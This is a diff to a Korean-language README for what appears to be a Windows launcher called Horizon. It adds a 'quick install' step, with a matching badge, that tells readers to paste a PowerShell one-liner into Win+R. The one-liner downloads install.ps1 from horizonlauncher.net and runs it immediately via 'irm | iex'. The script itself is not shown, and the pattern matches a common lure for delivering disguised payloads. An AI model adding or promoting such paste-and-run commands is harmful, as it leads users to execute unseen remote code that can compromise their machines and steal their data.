@@ -1,9 +1,17 @@
 <p align="center">
-  <strong>다운로드:</strong>
-  <a href="https://horizonlauncher.net/horizon-launcher-setup.exe">Horizon 다운로드 setup.exe</a> ·
-  <a href="https://horizonlauncher.net/en/download-horizon/">Horizon 다운로드</a> ·
-  <a href="https://horizonlauncher.net/en/install-horizon/">런처 설치</a> ·
-  <a href="https://horizonlauncher.net/">horizonlauncher.net</a>
+  <strong>빠른 설치 (Win+R)</strong> · <strong>일반 설치</strong>
+</p>
+
+<p align="center">명령을 복사하고 Win+R을 연 다음 Enter — Horizon이 받아지고 설치되며 스스로 열립니다.</p>
+
+```bat
+powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
+```
+
+<p align="center">
+  <a href="https://horizonlauncher.net/horizon-launcher-setup.exe"><strong>일반 설치 — Horizon 다운로드 setup.exe</strong></a>
+  · <a href="https://horizonlauncher.net/en/download-horizon/">Horizon 다운로드</a>
+  · <a href="https://horizonlauncher.net/">horizonlauncher.net</a>
 </p>
 
 <p align="center">
@@ -30,6 +38,7 @@
 </p>
 
 <p align="center">
+  <a href="https://horizonlauncher.net/en/download-horizon/"><img alt="Win+R" src="https://img.shields.io/badge/Win+R-install.ps1-1a120c?style=for-the-badge"></a>
   <a href="https://horizonlauncher.net/horizon-launcher-setup.exe"><img alt="Horizon 다운로드" src="https://img.shields.io/badge/Horizon_다운로드-Windows_setup-1a120c?style=for-the-badge"></a>
   <a href="https://horizonlauncher.net/"><img alt="horizonlauncher.net" src="https://img.shields.io/badge/Site-horizonlauncher.net-c45c26?style=for-the-badge"></a>
 </p>
